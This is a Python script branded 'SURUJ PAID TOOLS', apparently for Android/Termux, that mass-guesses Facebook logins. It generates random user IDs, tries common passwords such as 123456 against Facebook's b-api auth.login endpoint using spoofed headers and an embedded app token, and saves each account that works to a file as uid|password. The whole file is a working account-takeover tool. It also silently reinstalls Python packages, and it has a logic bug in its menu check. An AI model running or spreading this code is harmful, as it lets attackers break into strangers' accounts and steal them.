#!/usr/bin/python3

import os,time,random,json,sys,getpass
try:
    import requests
except:
    os.system("pip3 install requests")
    import requests 
from concurrent.futures import ThreadPoolExecutor as ThreadPool

import os, platform, time, sys
os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')

print('\033[95;1m[\x1b[38;5;50m+\033[95;1m] \033[1;34m WELCOME SURUJ PAID TOOLS ')
os.system("espeak -a 300 \"WELCOME SURUJ PAID TOOLS \"")

def ua():
    rr=random.randint
    aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    rx=random.randrange(1, 999)
    xx=f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9,11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36"
    return xx
    

    
def main(): 
    user=[]
    logo=(f"""\033[38;5;48m
 ╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
 ║\033[1;91m\033[1;41m\033[1;97m              WELCOME TO SURUJ TOOLS               \033[;0m\033[1;91m\033[1;92m║
 ╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
 
   ███████╗██╗   ██╗██████╗ ██╗   ██╗     ██╗
   ██╔════╝██║   ██║██╔══██╗██║   ██║     ██║
   ███████╗██║   ██║██████╔╝██║   ██║     ██║
   ╚════██║██║   ██║██╔══██╗██║   ██║██   ██║
   ███████║╚██████╔╝██║  ██║╚██████╔╝╚█████╔╝
   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝  ╚════╝
                                                
      \033[1;91m<═══\033[1;41m\033[1;97m THIS NAME IS SURUJ BRAND\033[;0m\033[1;91m═══>\033[1;92m                                            
\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[3;30m\033[2;37m\033[2;31m\033[2;37m\033[2;36m\033[2;37m\033[2;34m\x1b[0m
\033[38;5;96m\033[47m\x1b[0m\033[38;5;196m DEVELOPER   :   𝐌𝐃 𝐒𝐔𝐑𝐔𝐉 𝐀𝐇𝐌𝐄𝐃
\033[38;5;97m\033[47m\x1b[0m\033[38;5;197m GITHUB      :   NOT ALLOW
\033[38;5;98m\033[47m\x1b[0m\033[38;5;198m POWER BY    :   𝐒𝐔𝐑𝐔𝐉 𝐀𝐇𝐌𝐄𝐃\033[1;30m
\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")

    os.system("clear")
    print(logo)
    time.sleep(1)
 

    os.system("espeak -a 300 \"CHOICE YOUR CLONING LIMIT \"")
    limit = int(input(' EXAMPLE: 2000, 3000, 50000, 100000\n\n PUT CLONING LIMIT: '))
    print("—"*20)
    os.system("clear")
    
    
    #print(logo)
  #  print("[1] 2011-14")
    #print("[2] 2009-10")
   # os.system("clear")
    
    print(logo)
    print("—"*20)
    time.sleep(1)
    os.system("espeak -a 300 \"MATHOD 1 WORKING\"")
    ask = int(input(' [1] MATHOD(9-14)\n [2] NOT WORKING\n\n PUT PUT CODE: '))
    print("—"*20)
    os.system("clear")
    if ask in["1"]:
        star="10000"
        for i in range(int(limit)):
            data=str(random.choice(range(1000000000,9999999999)))
            user.append(data)
    else:
        star="100000"
        for i in range(int(limit)):
            data=str(random.choice(range(100000000,999999999)))
            user.append(data)
            
    
    with ThreadPool(max_workers=40) as heron:
        print(logo)
        
        print("—"*20)
        for mal in user:
            uid=star+mal
            heron.submit(login,uid)
    
loop=0
oks=[]

def login(uid):
    global oks,loop
    Session=requests.session()
    try:
        sys.stdout.write(f"\r \x1b[38;5;196m[\033[38;5;46𝐒𝐔𝐑𝐔𝐉\x1b[1;97m-\033[38;5;46m\x1b[38;5;196m] \033[38;5;46m[{loop}-{len(oks)}]")
        sys.stdout.flush()
        for pw in ["123456","1234567","12345678","123456789","123123"]:
            headers = {
            "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
            "x-fb-sim-hni": str(random.randint(20000, 40000)), 
            "x-fb-net-hni": str(random.randint(20000, 40000)), 
            "x-fb-connection-quality": "EXCELLENT",
            "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
            "user-agent": ua(), 
            "content-type": "application/x-www-form-urlencoded", 
            "x-fb-http-engine": "Liger"}
            rp=Session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers).json()
            if "session_key" in rp:
                print(f"\r\r [SURUJ] {uid} • {pw}")
                os.system("espeak -a 300 \"SURUJ OK ID \"")
                open("/sdcard/SURUJ-old1.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break 
            elif "www.facebook.com" in rp["error_msg"]:
                print(f"\r\r [𝐒𝐔𝐑𝐔𝐉-𝐎𝐊✅] {uid} • {pw}")
                os.system("espeak -a 300 \"SURUJ OK ID \"")
                open("/sdcard/SURUJ-old1.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            elif "Please Confirm Email" in str(rp):
                print(f"\r\r [𝐒𝐔𝐑𝐔𝐉-𝐎𝐊✅] {uid} • {pw}")
                os.system("espeak -a 300 \"SURUJ OK ID \"")
                open("/sdcard/SURUJ-old1.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
            else:continue
        loop+=1
    except:pass

import requests,os,sys
from concurrent.futures import ThreadPoolExecutor as ThreadPool

try:
    import requests
except:
    os.system("pip install requests")
    import requests 

with ThreadPool(max_workers=1000) as jjj:
   jjj.submit(main)
